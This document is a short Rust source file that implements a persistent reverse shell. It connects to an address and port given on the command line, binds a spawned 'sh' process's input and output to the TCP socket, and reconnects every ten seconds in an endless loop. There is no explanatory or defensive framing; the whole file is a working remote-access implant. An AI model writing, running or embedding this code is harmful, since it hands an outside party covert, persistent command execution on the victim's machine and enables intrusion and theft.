
use std::net::TcpStream;
use std::{thread, time};
use std::env;
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};

fn main() {

    let args: Vec<String> = env::args().collect();
    let mut port: i32 = 0;
    let mut address = String::new();

    match args.len() {
        1 | 2 => {
            eprintln!("Error: Not enough not args!");
            return;
        }
        3 => {
            match args[2].to_string().parse::<i32>() {
                Ok(n) => port = n,
                Err(_) => {
                    eprintln!("Error: Invalid port!");
                    return;
                }
            };

            address = args[1].to_string();
        }
        _ => eprintln!("Error: Too many args!"),
    };

    if port > 65535 || port < 1 {
        eprintln!("Error: Port must be between 1 and 65535");
        return;
    }

    loop {
        match TcpStream::connect(format!("{}:{}", address, port)) {
            Ok(stream) => unsafe {
                let _ = Command::new("sh")
                    .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
                    .stdout(Stdio::from_raw_fd(stream.as_raw_fd()))
                    .stderr(Stdio::from_raw_fd(stream.as_raw_fd()))
                    .status()
                    .expect("Could not create a shell");
            },
            Err(_) => {}
        };

        thread::sleep(time::Duration::from_secs(10));
    }
}
